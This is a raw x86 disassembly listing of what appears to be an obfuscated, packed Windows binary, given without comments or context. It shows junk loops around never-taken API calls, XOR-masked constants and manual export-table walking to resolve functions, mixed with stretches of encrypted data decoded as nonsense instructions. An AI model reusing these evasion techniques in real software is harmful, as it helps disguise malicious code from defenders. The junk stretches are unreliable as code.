  41124d:	or     bh,BYTE PTR [eax]
  41124f:	mov    ebp,0x24cd99a8
  411254:	out    dx,al
  411255:	repnz retf 0x986f
  411259:	scas   eax,DWORD PTR es:[edi]
  41125a:	sbb    eax,0xe20e0472
  41125f:	(bad)  
  411260:	sub    BYTE PTR [edi],cl
  411262:	ret    0xc0bb
  411265:	and    ebx,DWORD PTR [eax-0x17]
  411268:	out    dx,eax
  411269:	push   es
  41126a:	cli    
  41126b:	mov    esp,0xf93d4b52
  411270:	fxch   st(5)
  411272:	push   0x8874d8c0
  411277:	sub    ebp,ebx
  411279:	test   DWORD PTR [esi*4-0x238fe8db],ebx
  411280:	ins    BYTE PTR es:[edi],dx
  411281:	ficom  DWORD PTR [edi-0x37]
  411284:	and    ecx,DWORD PTR ds:0x5c916845
  41128a:	cs inc ax
  41128d:	pop    edi
  41128e:	xor    esp,edi
  411290:	add    bh,dl
  411292:	js     0x4112b3
  411294:	sbb    eax,0xeed2722c
  411299:	cwde   
  41129a:	add    al,0xbd
  41129c:	push   eax
  41129d:	cmp    eax,edi
  41129f:	lds    ebx,FWORD PTR ds:0x325bf7ac
  4112a5:	push   edx
  4112a6:	fstp   QWORD PTR [eax-0x59]
  4112a9:	push   ecx
  4112aa:	xchg   ebp,eax
  4112ab:	inc    edx
  4112ac:	mov    bl,0xe3
  4112ae:	pop    ebp
  4112af:	mov    dl,bl
  4112b1:	pop    ds
  4112b2:	mov    DWORD PTR [ecx-0x7b],esi
  4112b5:	mov    cl,0xb5
  4112b7:	sbb    al,0x23
  4112b9:	pop    ebx
  4112ba:	jl     0x411258
  4112bc:	inc    esi
  4112bd:	jp     0x41128b
  4112bf:	jne    0x4112d2
  4112c1:	mov    esi,0xaba37aba
  4112c6:	add    eax,esp
  4112c8:	aas    
  4112c9:	xchg   dh,ah
  4112cb:	sub    BYTE PTR ds:0x44a3212f,al
  4112d1:	aas    
  4112d2:	cmp    eax,0xbee490e8
  4112d7:	stos   BYTE PTR es:[edi],al
  4112d8:	sub    BYTE PTR [ecx+0x5a],0x66
  4112dc:	rol    DWORD PTR ss:[ebp+0x76],1
  4112e0:	call   0xc1d9:0xc8a6a502
  4112e7:	fdiv   st,st(0)
  4112e9:	xor    esi,eax
  4112eb:	mov    eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434603
  411346:	xor    DWORD PTR ds:0x4345cf,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x4344ff,0x14
  41135d:	cmp    DWORD PTR ds:0x4344ff,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x4344ff,0x3
  411371:	jne    0x411387
  411377:	push   0x43477a
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x4344ff,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x4344ff
  411399:	dec    eax
  41139a:	mov    ds:0x4344ff,eax
  41139f:	mov    eax,ds:0x4344ff
  4113a4:	dec    eax
  4113a5:	mov    ds:0x4344ff,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x4344ef,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x434543,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x434543
  4113d0:	inc    eax
  4113d1:	mov    ds:0x434543,eax
  4113d6:	cmp    DWORD PTR ds:0x434543,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x434543,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x43457f
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x434543,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x434543
  411418:	inc    eax
  411419:	mov    ds:0x434543,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43460f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43460f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43460f,ebx
  411442:	cmp    DWORD PTR ds:0x43460f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434593
  411457:	push   0x4346db
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43460f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43460f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43460f,ebx
  41147c:	cmp    DWORD PTR ds:0x43460f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x4344df
  411490:	adc    DWORD PTR ds:0x4345c7,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434583,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434603,0x4344e7
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x4345d3,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x4345f7,0x4344f3
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x4345cb,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x4344ff,0x43453f
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434613,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x4344ff,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x4344ff
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x4344ff,edi
  411509:	cmp    DWORD PTR ds:0x4344ff,0xb
  411510:	jne    0x411529
  411516:	push   0x434607
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x4344ff,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x4344ff
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x4344ff,edi
  411545:	cmp    DWORD PTR ds:0x4344ff,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x4344e7,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x4344f7,0x1a
  411569:	cmp    DWORD PTR ds:0x4344f7,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x4344f7,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x4344f7,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x4344f7
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x4344f7,edi
  4115ac:	mov    edi,DWORD PTR ds:0x4344f7
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x4344f7,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x4344eb
  4115c4:	adc    DWORD PTR ds:0x4344e3,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43460b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43460b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43460b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43460b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43460b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43460b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43460b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43460b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x4115d1
  411641:	retf   0x2e81
  411644:	(bad)  
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x411656
  41164d:	lds    esi,FWORD PTR [eax+0x7c]
  411650:	es xchg ebx,eax
  411652:	xchg   edx,eax
  411653:	mov    ch,0x2e
  411655:	es mov cl,0x6a
  411658:	popa   
  411659:	dec    esp
  41165a:	jecxz  0x4116a5
  41165c:	jno    0x41167a
  41165e:	mov    edx,0xb9f1e5df
  411663:	call   0x1be595aa
  411668:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411669:	sub    BYTE PTR [edx+0x312f127f],ah
  41166f:	push   ds
  411670:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411671:	and    ecx,DWORD PTR [esi-0x29]
  411674:	sub    BYTE PTR [edi-0x52],al
  411677:	cwde   
  411678:	fmul   DWORD PTR [eax+0x35]
  41167b:	xchg   ebx,eax
  41167c:	jb     0x4116a8
  41167e:	pop    ebp
  41167f:	es cs dec esi
  411682:	dec    ebp
  411683:	jmp    0xbec8:0x4592cac1
  41168a:	js     0x4116c4
  41168c:	pop    es
  41168d:	fldcw  WORD PTR [edx-0x6]
  411690:	call   0x3ffd:0x5479ef97
  411697:	or     eax,0xa48d6e98
  41169c:	ret    
  41169d:	mov    eax,ds:0x647c6ad4
  4116a2:	xor    edx,edx
  4116a4:	mov    dl,ch
  4116a6:	push   ebx
  4116a7:	pop    ecx
  4116a8:	and    ah,cl
  4116aa:	cli    
  4116ab:	mov    cl,0xd4
  4116ad:	lods   eax,DWORD PTR ds:[esi]
  4116ae:	pushf  
  4116af:	sub    DWORD PTR [edx-0x3d],0x6b1e73bb
  4116b6:	sub    DWORD PTR [ebx],ebx
  4116b8:	call   0xfb096a04
  4116bd:	cs add al,0xf0
  4116c0:	icebp  
  4116c1:	or     dh,al
  4116c3:	icebp  
  4116c4:	xlat   BYTE PTR ds:[ebx]
  4116c5:	cmp    ch,BYTE PTR [esi]
  4116c7:	cmp    ebp,DWORD PTR ds:0xbcdc56f7
  4116cd:	into   
  4116ce:	xchg   BYTE PTR [ebx],bh
  4116d0:	xor    ecx,edx
  4116d2:	neg    DWORD PTR [eax+0x40b838ef]
  4116d8:	and    eax,DWORD PTR [eax-0x3f]
  4116db:	push   0x76
  4116dd:	fstp   DWORD PTR [ebx]
  4116df:	test   DWORD PTR [ebp+0x5735fa2],0xfb9afb93
  4116e9:	jge    0x41172b
  4116eb:	(bad)  
  4116ec:	jl     0x411689
  4116ee:	push   ebx
  4116ef:	inc    ecx
  4116f0:	adc    eax,0x26fa3924
  4116f6:	dec    edx
  4116f7:	or     DWORD PTR [esi+ebx*4],edi
  4116fa:	fnsave [eax+0x13be452f]
  411700:	sub    al,0x9e
  411702:	push   ss
  411703:	test   al,0x3f
  411705:	scas   al,BYTE PTR es:[edi]
  411706:	inc    esp
  411707:	ret    
  411708:	test   DWORD PTR [eax-0x12],0x5fb6ae5e
  41170f:	jmp    0x411766
  411711:	sub    BYTE PTR [esi-0x5ecc02ab],dl
  411717:	jecxz  0x41178b
  411719:	lds    esp,FWORD PTR [ebx+0x42e8d7f8]
  41171f:	add    esi,ebp
  411721:	jne    0x41172a
  411723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411724:	jg     0x4116dd
  411726:	dec    eax
  411727:	pop    ebp
  411728:	jmp    0x4761a435
  41172d:	pop    eax
  41172e:	cmp    BYTE PTR [ebp-0x52],bl
  411731:	js     0x411799
  411733:	ror    DWORD PTR [edx-0x10],1
  411736:	stos   BYTE PTR es:[edi],al
  411737:	inc    edx
  411738:	sbb    edi,DWORD PTR [ebx+0x62]
  41173b:	in     al,0xc9
  41173d:	or     BYTE PTR [esi],cl
  41173f:	imul   esi,DWORD PTR [edi+0x30],0xffffffb3
  411743:	xchg   esp,eax
  411744:	push   DWORD PTR [ecx+ebx*1+0x28]
  411748:	rcl    al,1
  41174a:	aad    0xe4
  41174c:	in     eax,0xc8
  41174e:	cld    
  41174f:	or     DWORD PTR [ecx],0xffffffab
  411752:	ins    DWORD PTR es:[edi],dx
  411753:	add    DWORD PTR [ebx+0x53],edx
  411756:	in     al,dx
  411757:	add    cl,BYTE PTR [ecx-0x6c1c8b49]
  41175d:	jb     0x4117af
  41175f:	jo     0x411799
  411761:	push   0x4ad62759
  411766:	sar    BYTE PTR [ebp+0x3],1
  411769:	inc    edx
  41176a:	and    ebx,DWORD PTR [esi+0x58530bbe]
  411770:	add    esi,DWORD PTR [edi+edi*1-0x30]
  411774:	push   0x6e9de114
  411779:	shr    BYTE PTR [ecx-0x69],cl
  41177c:	xchg   DWORD PTR [ecx+edi*2],edx
  41177f:	jne    0x4117b0
  411781:	mov    edx,0xd64bb983
  411786:	and    DWORD PTR [ebx+0x5d],ecx
  411789:	push   edi
  41178a:	push   eax
  41178b:	or     DWORD PTR [edi+esi*2+0x57],eax
  41178f:	sub    cl,BYTE PTR [ecx+edi*2]
  411792:	rol    DWORD PTR [ebx],1
  411794:	xchg   DWORD PTR [edx-0x45],ebp
  411797:	dec    edx
  411798:	stc    
  411799:	aaa    
  41179a:	(bad)  
  41179e:	sub    al,0xd3
  4117a0:	fisubr DWORD PTR [ecx+0x70]
  4117a3:	mov    edi,DWORD PTR [eax]
  4117a5:	add    eax,0x21afe067
  4117aa:	imul   ecx,DWORD PTR ds:0x10def584,0x27
  4117b1:	stc    
  4117b2:	clc    
  4117b3:	mov    esi,0x76a99604
  4117b8:	ret    
  4117b9:	(bad)  
  4117ba:	xchg   ebx,eax
  4117bb:	mov    ch,0x67
  4117bd:	inc    ebx
  4117be:	inc    esi
  4117bf:	out    dx,eax
  4117c0:	add    DWORD PTR [ecx],esi
  4117c2:	ins    BYTE PTR es:[edi],dx
  4117c3:	cmovp  esi,DWORD PTR [ebx+0x2a]
  4117c7:	retf   0x2eae
  4117ca:	dec    edi
  4117cb:	xor    DWORD PTR [eax],ebp
  4117cd:	lahf   
  4117ce:	inc    edi
  4117cf:	daa    
  4117d0:	pusha  
  4117d1:	jle    0x4117ef
  4117d3:	adc    DWORD PTR [eax-0x52],ecx
  4117d6:	loopne 0x41184a
  4117d8:	add    BYTE PTR [ecx],ah
  4117da:	xor    ebx,DWORD PTR [ebp+0x1bd7748]
  4117e0:	imul   edi,DWORD PTR [edi+0x6a785a36],0x43290920
  4117ea:	das    
  4117eb:	arpl   bp,sp
  4117ed:	inc    esp
  4117ee:	inc    eax
  4117ef:	ja     0x41179a
  4117f1:	inc    DWORD PTR [edx]
  4117f3:	stc    
  4117f4:	adc    ah,BYTE PTR [edi+0x4278971c]
  4117fa:	inc    ebp
  4117fb:	sub    esi,DWORD PTR [edx+0x5c]
  4117fe:	loopne 0x411875
  411800:	scas   al,BYTE PTR es:[edi]
  411801:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411802:	jmp    0x356e:0xf6fe9643
  411809:	add    ecx,DWORD PTR [edi-0x4ee38435]
  41180f:	lahf   
  411810:	data16 daa 
  411812:	test   al,0x76
  411814:	xchg   esp,eax
  411815:	repz repz cli 
  411818:	dec    esp
  411819:	inc    ebx
  41181a:	loopne 0x41188c
  41181c:	gs (bad) 
  41181e:	or     eax,0x8c2c2149
  411823:	gs push eax
  411825:	daa    
  411826:	stc    
  411827:	sar    eax,cl
  411829:	jae    0x411821
  41182b:	pop    edi
  41182c:	push   edx
  41182d:	mov    ds:0x7879be8b,al
  411832:	add    BYTE PTR [eax],al
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	mov    bh,0x3
  411852:	fidiv  WORD PTR ds:0x7e7e54ea
  411858:	pop    ecx
  411859:	jg     0x4118d9
  41185b:	jle    0x41186b
  41185d:	std    
  41185e:	lock int 0x73
  411861:	adc    bl,ah
  411863:	add    BYTE PTR [esi-0x30],0x35
  411867:	fld    DWORD PTR [esp+edi*1]
  41186a:	cld    
  41186b:	sub    BYTE PTR [ebx],0x78
  41186e:	mov    bh,0xea
  411870:	call   0x9c0e:0xccbdd35e
  411877:	mov    WORD PTR [esi+0x2e],fs
  41187a:	mov    WORD PTR [eax+0x79],ds
  41187d:	push   ss
  41187e:	enter  0x337e,0x91
  411882:	mov    eax,ds:0xc28f22ab
  411887:	inc    ebx
  411888:	xor    BYTE PTR [ebx-0x444db889],bh
  41188e:	addr16 mov ecx,0xda77f443
  411894:	cmp    DWORD PTR [ebp+0x2f],esp
  411897:	xchg   ebx,eax
  411898:	mov    bl,0x18
  41189a:	das    
  41189b:	pop    edx
  41189c:	mov    ds:0xbe66a45b,al
  4118a1:	popf   
  4118a2:	pop    ebp
  4118a3:	sub    BYTE PTR [eax+0x1f54ecba],al
  4118a9:	jle    0x4118c6
  4118ab:	cmp    edx,ecx
  4118ad:	xor    BYTE PTR [ebx-0x3],dh
  4118b0:	inc    ebp
  4118b1:	(bad)  
  4118b2:	mov    cl,0xf7
  4118b4:	and    dl,BYTE PTR ds:0x3b20b87c
  4118ba:	push   ecx
  4118bb:	xor    BYTE PTR [edx-0x76],dh
  4118be:	or     BYTE PTR [edi],al
  4118c0:	xchg   DWORD PTR [edi+0xe],ebp
  4118c3:	ret    0x9536
  4118c6:	fwait
  4118c7:	push   esp
  4118c8:	test   al,0xcb
  4118ca:	sar    BYTE PTR [edx-0x4168c409],cl
  4118d0:	lods   eax,DWORD PTR ds:[esi]
  4118d1:	xchg   ebp,eax
  4118d2:	mov    esi,0xe44b5a7b
  4118d7:	pop    ss
  4118d8:	dec    esp
  4118d9:	cmp    esp,DWORD PTR [ebx+0x2d]
  4118dc:	shl    BYTE PTR [edx+0x515b315b],0xf5
  4118e3:	fnstenv [edx-0x80]
  4118e6:	jg     0x411942
  4118e8:	call   0xbe4c:0xceb3129f
  4118ef:	sub    al,0xc7
  4118f1:	xor    cl,BYTE PTR [ebp+0x3a]
  4118f4:	xchg   esi,eax
  4118f5:	mov    edx,0xb902d36b
  4118fa:	and    dl,al
  4118fc:	div    BYTE PTR [edx-0x6a11ad35]
  411902:	mul    BYTE PTR [ebp-0x2779b076]
  411908:	add    DWORD PTR ds:0xf05e4e23,0x99787b4f
  411912:	adc    BYTE PTR [ecx+0xca75a9d],dl
  411918:	mov    ds:0xe44f29c,eax
  41191d:	cmp    DWORD PTR [ecx+edx*1+0x5c],0xe2e56e3c
  411925:	test   DWORD PTR [ebp-0x51],edx
  411928:	mov    eax,0x269aad9e
  41192d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41192e:	push   ss
  41192f:	jns    0x4118cc
  411931:	push   edx
  411932:	and    eax,0xdb08b2ca
  411937:	inc    ecx
  411938:	test   eax,0x96ba7380
  41193d:	scas   al,BYTE PTR es:[edi]
  41193e:	and    eax,0x31c38cc1
  411943:	imul   edi,DWORD PTR [eax+0x5e589e20],0xd8e6b1c3
  41194d:	and    al,0x51
  41194f:	pop    esp
  411950:	mov    ebp,0xca943de5
  411955:	sub    edi,DWORD PTR [edx-0x1c]
  411958:	(bad)  
  411959:	(bad)  
  41195b:	mov    ch,0x49
  41195d:	fmul   QWORD PTR [edi]
  41195f:	ret    
  411960:	dec    edi
  411961:	(bad)  
  411962:	xor    eax,0x6c0e02ec
  411967:	push   edi
  411968:	push   0xffffff9b
  41196a:	xchg   ebp,eax
  41196b:	aaa    
  41196c:	bsr    esi,DWORD PTR ds:0xd1bea4c8
  411973:	pop    esp
  411974:	aad    0x13
  411976:	inc    ebx
  411977:	pop    edx
  411978:	push   ebx
  411979:	test   eax,0x299f50f1
  41197e:	xor    DWORD PTR [edi],edx
  411980:	pop    ebx
  411981:	push   esp
  411982:	(bad)  
  411984:	jae    0x4119ed
  411986:	mov    cl,0x54
  411988:	div    BYTE PTR [esp+esi*8]
  41198b:	mov    ds:0x6e99c462,al
  411990:	add    al,0x82
  411992:	cmp    BYTE PTR es:[eax+edi*8-0x78],bh
  411997:	pop    ds
  411998:	mov    WORD PTR [edx],?
  41199a:	xor    ebx,DWORD PTR [edi]
  41199c:	rol    dl,cl
  41199e:	std    
  41199f:	push   esp
  4119a0:	push   0x13
  4119a2:	mov    ebx,0x61ca37c
  4119a7:	adc    eax,0x565597d7
  4119ac:	das    
  4119ad:	dec    esi
  4119ae:	call   0xb6accd31
  4119b3:	ret    
  4119b4:	xchg   edi,eax
  4119b5:	dec    esi
  4119b6:	ja     0x411938
  4119b8:	or     al,0xd0
  4119ba:	stc    
  4119bb:	or     BYTE PTR [ebx-0xa],bl
  4119be:	add    ebx,DWORD PTR fs:[esi+eiz*2]
  4119c2:	retf   
  4119c3:	call   0x6c6c:0x16d4b91a
  4119ca:	ins    BYTE PTR es:[edi],dx
  4119cb:	mov    esp,0xaefae385
  4119d0:	retf   
  4119d1:	ficom  DWORD PTR [ebp-0x5b0b38de]
  4119d7:	out    dx,al
  4119d8:	inc    esp
  4119d9:	mov    ch,0xe5
  4119db:	nop
  4119dc:	cmp    DWORD PTR [ebp+ecx*2+0x707c8637],ebp
  4119e3:	dec    edi
  4119e4:	pop    ecx
  4119e5:	ret    0x6af1
  4119e8:	xor    ah,BYTE PTR [ecx+0x5c5af350]
  4119ee:	and    ecx,esp
  4119f0:	xchg   ebx,edx
  4119f2:	xchg   ebx,esi
  4119f4:	mov    ds:0x13242462,eax
  4119f9:	dec    ecx
  4119fa:	jge    0x411a6a
  4119fc:	mov    edx,0x771ef722
  411a01:	cs add ebx,esi
  411a04:	push   ecx
  411a05:	(bad)  
  411a06:	cmp    cl,bl
  411a08:	push   esi
  411a09:	test   BYTE PTR [ebx-0x3519ea65],0x47
  411a10:	cmp    ch,BYTE PTR [ebx+0x4f]
  411a13:	mov    cl,0xc5
  411a15:	es jmp 0x9131:0x37619187
  411a1d:	icebp  
  411a1e:	push   esp
  411a1f:	sbb    DWORD PTR [edx+eax*2-0xc],eax
  411a23:	cs mov cs,eax
  411a26:	in     eax,dx
  411a27:	adc    eax,0xb05a8c31
  411a2c:	repz inc eax
  411a2e:	jae    0x411a97
  411a30:	fcmovb st,st(3)
  411a32:	(bad)  
  411a33:	(bad)  
  411a34:	push   ss
  411a35:	inc    esi
  411a36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a37:	cmp    eax,0x83337eb6
  411a3c:	jmp    0xcec88cb2
  411a41:	sub    edx,edi
  411a43:	xor    ecx,DWORD PTR ds:0x434577
  411a49:	xor    esi,esi
  411a4b:	adc    DWORD PTR ds:0x4344f7,edi
  411a51:	mov    DWORD PTR [ebp-0x28],esi
  411a54:	mov    DWORD PTR [ebp-0x2c],esi
  411a57:	dec    DWORD PTR ds:0x4345cf
  411a5d:	mov    DWORD PTR [ebp-0x14],esi
  411a60:	mov    DWORD PTR [ebp-0x8],esi
  411a63:	mov    ecx,DWORD PTR [ebp-0x18]
  411a66:	add    DWORD PTR ds:0x4345cf,0x3520
  411a70:	xor    ecx,eax
  411a72:	xor    edi,edi
  411a74:	add    ecx,ebx
  411a76:	mov    DWORD PTR [ebp-0x20],ecx
  411a79:	mov    DWORD PTR ds:0x434537,ebx
  411a7f:	mov    eax,DWORD PTR [ebp-0x20]
  411a82:	mov    DWORD PTR ds:0x4344ff,0x2abf
  411a8c:	je     0x4122b7
  411a92:	adc    DWORD PTR ds:0x4344eb,0x60fd
  411a9c:	mov    eax,DWORD PTR [ebp-0x4]
  411a9f:	adc    DWORD PTR ds:0x434553,0x6e6
  411aa9:	xor    eax,0x7510851
  411aae:	or     DWORD PTR ds:0x4345c3,0x43457b
  411ab8:	add    eax,ebx
  411aba:	mov    DWORD PTR ds:0x434613,0x35f1
  411ac4:	cmp    edi,eax
  411ac6:	jne    0x411c5a
  411acc:	sbb    DWORD PTR ds:0x4344f3,0x4344e7
  411ad6:	push   DWORD PTR [ebp+0x8]
  411ad9:	or     DWORD PTR ds:0x43460f,0x4345cb
  411ae3:	call   0x4104be
  411ae8:	and    ecx,DWORD PTR ds:0x43454f
  411aee:	mov    DWORD PTR [ebp-0x20],eax
  411af1:	mov    eax,DWORD PTR [ebp-0x4]
  411af4:	mov    ecx,DWORD PTR [ebp-0x20]
  411af7:	and    DWORD PTR ds:0x4345b7,0x0
  411b01:	mov    esi,DWORD PTR ds:0x4345b7
  411b07:	inc    esi
  411b08:	mov    DWORD PTR ds:0x4345b7,esi
  411b0e:	cmp    DWORD PTR ds:0x4345b7,0x1e
  411b15:	jne    0x411b26
  411b1b:	push   0x1cd9
  411b20:	call   DWORD PTR ds:0x4132b4
  411b26:	cmp    DWORD PTR ds:0x4345b7,0x18
  411b2d:	jb     0x411b01
  411b33:	mov    esi,0x7510851
  411b38:	xor    eax,esi
  411b3a:	add    eax,ebx
  411b3c:	cmp    ecx,eax
  411b3e:	je     0x411e9b
  411b44:	or     DWORD PTR ds:0x4345b7,0x434577
  411b4e:	push   DWORD PTR [ebp-0x20]
  411b51:	push   DWORD PTR [ebp+0x8]
  411b54:	sub    DWORD PTR ds:0x434537,0x4344e7
  411b5e:	call   0x404d31
  411b63:	movzx  ecx,WORD PTR ds:0x4345b7
  411b6a:	and    ecx,DWORD PTR ds:0x43458b
  411b70:	mov    DWORD PTR ds:0x4345b7,ecx
  411b76:	mov    DWORD PTR [ebp-0x14],eax
  411b79:	mov    DWORD PTR ds:0x43460f,0x13
  411b83:	cmp    DWORD PTR ds:0x43460f,0x0
  411b8a:	je     0x411bc6
  411b90:	cmp    DWORD PTR ds:0x43460f,0x22
  411b97:	jne    0x411bad
  411b9d:	push   0x434710
  411ba2:	push   0x4346b5
  411ba7:	call   DWORD PTR ds:0x4130e4
  411bad:	xor    eax,eax
  411baf:	or     eax,DWORD PTR ds:0x43460f
  411bb5:	dec    eax
  411bb6:	mov    ds:0x43460f,eax
  411bbb:	jmp    0x411b83
  411bc0:	add    DWORD PTR ds:0x4344eb,edx
  411bc6:	mov    eax,DWORD PTR [ebp-0x4]
  411bc9:	mov    DWORD PTR ds:0x4345cb,0x10
  411bd3:	cmp    DWORD PTR ds:0x4345cb,0x0
  411bda:	je     0x411c1c
  411be0:	cmp    DWORD PTR ds:0x4345cb,0x1b
  411be7:	jne    0x411c0a
  411bed:	push   DWORD PTR [ebp-0x20]
  411bf0:	push   0x4372
  411bf5:	push   0x4347d5
  411bfa:	push   0x4347e9
  411bff:	push   0x7ff3
  411c04:	call   DWORD PTR ds:0x4130e8
  411c0a:	mov    ecx,DWORD PTR ds:0x4345cb
  411c10:	dec    ecx
  411c11:	mov    DWORD PTR ds:0x4345cb,ecx
  411c17:	jmp    0x411bd3
  411c1c:	mov    ecx,DWORD PTR [ebp-0x14]
  411c1f:	xor    eax,esi
  411c21:	add    eax,ebx
  411c23:	cmp    ecx,eax
  411c25:	je     0x411e9b
  411c2b:	mov    eax,DWORD PTR [ebp-0x14]
  411c2e:	mov    eax,DWORD PTR [eax+0x18]
  411c31:	mov    DWORD PTR [ebp-0x20],eax
  411c34:	mov    eax,DWORD PTR [ebp-0x14]
  411c37:	mov    ecx,DWORD PTR [ebp+0x8]
  411c3a:	add    ecx,DWORD PTR [eax+0x20]
  411c3d:	mov    DWORD PTR [ebp-0x28],ecx
  411c40:	mov    eax,DWORD PTR [ebp-0x14]
  411c43:	mov    ecx,DWORD PTR [ebp+0x8]
  411c46:	add    ecx,DWORD PTR [eax+0x24]
  411c49:	mov    DWORD PTR [ebp-0x2c],ecx
  411c4c:	mov    eax,DWORD PTR [ebp-0x14]
  411c4f:	mov    ecx,DWORD PTR [ebp+0x8]
  411c52:	add    ecx,DWORD PTR [eax+0x1c]
  411c55:	xor    esi,esi
